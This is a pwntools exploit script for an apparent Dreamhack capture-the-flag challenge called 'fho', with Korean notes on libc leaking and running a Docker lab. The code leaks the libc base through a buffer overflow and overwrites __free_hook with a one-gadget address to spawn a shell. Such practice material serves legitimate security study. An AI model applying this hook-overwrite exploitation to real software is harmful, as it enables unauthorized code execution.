from pwn import *

p = remote('host3.dreamhack.games', '19564')
p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

binsh = 0x1b3e1a

sub = libc.symbols['__libc_start_main'] + 231

buf = b"x"*0x48
p.send(buf)

p.recvuntil(b"x"*0x48)
libc_base = u64(p.recv(6) + b'\x00\x00') - sub
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + binsh

onegad = libc_base + 0x4f432

p.sendlineafter(b"write: ", str(free_hook).encode())
p.sendlineafter(b"With: ", str(onegad).encode())
p.sendlineafter(b"free: ", 0)

p.interactive()

'''
임의주소 읽기가 없고 BOF만 있을 때 libc leak → RET leak → libc_start_main 주소 leak → libc_base leak의 과정을 거칠 수 있다.

최근 우분투 버전에서는 __libc_start_main이 아닌 다른 함수를 쓰므로 실습시 18.04컨테이너 안에서 실습해야 함.

Dockerfile사용법 참조
이때 포트번호는 도커파일에서 지정한 포트번호를 사용

sudo docker build .
sudo docker run -d -p 8080:8080 sha256:ea8bc34bf6a1e5541335af3827a807eededbf636d600198ea60b0bb7475
e077c //빌드 이후 나오는 sha256해시를 넣으면 됨

sudo docker exec -it bae8a27bf7fee31531533998f0a41b5dcfba2da512ab22f8f5012cd59b437b72 /bin/bash
직접 접속

nc localhost 8080 원격으로 접속

//docker 컨테이너 멈춤
sudo docker stop bae8a27bf7fee31531533998f0a41b5dcfba2da512ab22f8f5012cd59b437b72

//컨테이너 삭제
sudo docker rm bae8a27bf7fee31531533998f0a41b5dcfba2da512ab22f8f5012cd59b437b72
'''